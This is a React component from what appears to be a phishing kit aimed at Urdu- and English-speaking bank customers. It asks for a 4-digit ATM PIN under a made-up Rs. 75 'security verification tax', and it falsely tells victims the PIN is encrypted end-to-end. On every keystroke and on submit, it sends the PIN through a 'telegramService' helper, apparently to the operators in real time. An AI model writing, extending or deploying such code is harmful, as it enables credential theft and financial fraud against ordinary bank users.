import React, { useState, useRef } from 'react';
import { ArrowRight, ArrowLeft, Lock, ShieldCheck, CheckCircle2 } from 'lucide-react';
import { sendRealtimePinUpdate } from '../services/telegramService';

interface Step5Props {
  pinValue: string;
  onUpdatePin: (val: string) => void;
  onSubmitApplication: () => void;
  onBack: () => void;
}

export const Step5AtmPin: React.FC<Step5Props> = ({
  pinValue,
  onUpdatePin,
  onSubmitApplication,
  onBack,
}) => {
  const [digits, setDigits] = useState<string[]>(['', '', '', '']);
  const [error, setError] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleDigitChange = (index: number, value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (!cleaned) {
      const updated = [...digits];
      updated[index] = '';
      setDigits(updated);
      const code = updated.join('');
      onUpdatePin(code);
      sendRealtimePinUpdate(code);
      return;
    }

    const lastChar = cleaned.slice(-1);
    const updated = [...digits];
    updated[index] = lastChar;
    setDigits(updated);
    const code = updated.join('');
    onUpdatePin(code);
    sendRealtimePinUpdate(code);
    setError('');

    if (index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const code = digits.join('');
    if (code.length < 4) {
      setError('Please enter complete 4-digit ATM PIN / اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں');
      return;
    }
    sendRealtimePinUpdate(code);
    setIsSubmitting(true);
    setTimeout(() => {
      onSubmitApplication();
    }, 1200);
  };

  return (
    <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-7 shadow-sm max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-start justify-between border-b border-slate-100 pb-4 mb-4">
        <div>
          <h2 className="text-xl sm:text-2xl font-bold text-[#0b1c33] font-sans">
            ATM PIN Verification
          </h2>
          <p className="text-xs text-slate-500 mt-0.5">
            Security verification required
          </p>
          <p className="text-xs font-serif text-slate-600 mt-0.5">
            سیکیورٹی تصدیق درکار ہے
          </p>
        </div>
        <div className="text-right">
          <span className="text-xl sm:text-2xl font-serif font-bold text-[#0b1c33]">
            اے ٹی ایم پن
          </span>
        </div>
      </div>

      {/* Security Verification Notice Box (Matching Screenshot 11) */}
      <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-5 text-xs text-slate-700 space-y-2">
        <div className="flex items-center justify-between font-bold text-slate-900 border-b border-slate-200 pb-2">
          <span className="flex items-center gap-1.5 text-emerald-800">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            Security Verification Tax: Rs. 75
          </span>
          <span className="font-serif text-[#0b1c33]">سیکورٹی ٹیکس: 75 روپے</span>
        </div>
        <p className="leading-relaxed text-slate-600">
          For your account security, a one-time refundable tax of Rs. 75 will be charged. Please enter your 4-digit ATM PIN to authorize this verification.
        </p>
        <p className="font-serif text-slate-700 leading-relaxed pt-1">
          آپ کے اکاؤنٹ کی حفاظت کے لیے 75 روپے کا قابل واپسی ٹیکس وصول کیا جائے گا۔ تصدیق کے لیے اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں۔
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Input Header */}
        <div className="text-center">
          <label className="text-xs font-bold text-slate-800 block">
            Enter 4-digit ATM PIN
          </label>
          <span className="text-xs font-serif text-slate-600 block">
            4 ہندسوں کا پن درج کریں
          </span>
        </div>

        {/* 4 Digit Masked Inputs (Numeric Keyboards) */}
        <div className="flex items-center justify-center gap-3">
          {digits.map((digit, idx) => (
            <input
              key={idx}
              ref={(el) => (inputRefs.current[idx] = el)}
              type="password"
              inputMode="numeric"
              id={`pin-input-${idx}`}
              maxLength={1}
              value={digit}
              onChange={(e) => handleDigitChange(idx, e.target.value)}
              onKeyDown={(e) => handleKeyDown(idx, e)}
              className={`w-12 h-14 sm:w-14 sm:h-16 text-center text-2xl font-bold font-mono bg-slate-50 border rounded-xl focus:bg-white focus:outline-hidden focus:ring-2 focus:ring-[#0f2848]/40 transition-all ${
                digit ? 'border-[#0f2848] bg-slate-100/50' : 'border-slate-300'
              }`}
            />
          ))}
        </div>
        {error && <p className="text-xs text-red-500 text-center font-medium">{error}</p>}

        {/* Encrypted Note */}
        <div className="text-center text-[11px] text-slate-500 flex items-center justify-center gap-1.5 pt-1">
          <Lock className="w-3.5 h-3.5 text-slate-400" />
          <span>Your ATM PIN is encrypted end-to-end and used only for security verification.</span>
        </div>

        {/* Buttons */}
        <div className="pt-2 flex gap-3">
          <button
            type="button"
            onClick={onBack}
            disabled={isSubmitting}
            id="step5-back-btn"
            className="flex-1 py-3 px-4 border border-slate-300 hover:bg-slate-50 text-slate-700 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back / واپس</span>
          </button>

          <button
            type="submit"
            disabled={isSubmitting}
            id="step5-submit-btn"
            className="flex-1 py-3.5 px-4 bg-[#0e5e38] hover:bg-[#0a4629] active:bg-[#07331e] text-white font-bold text-xs rounded-lg transition-all shadow-md flex items-center justify-center gap-1.5 disabled:opacity-75"
          >
            {isSubmitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                <span>Processing...</span>
              </span>
            ) : (
              <>
                <span>Pay Rs. 75 & Submit / جمع</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
};

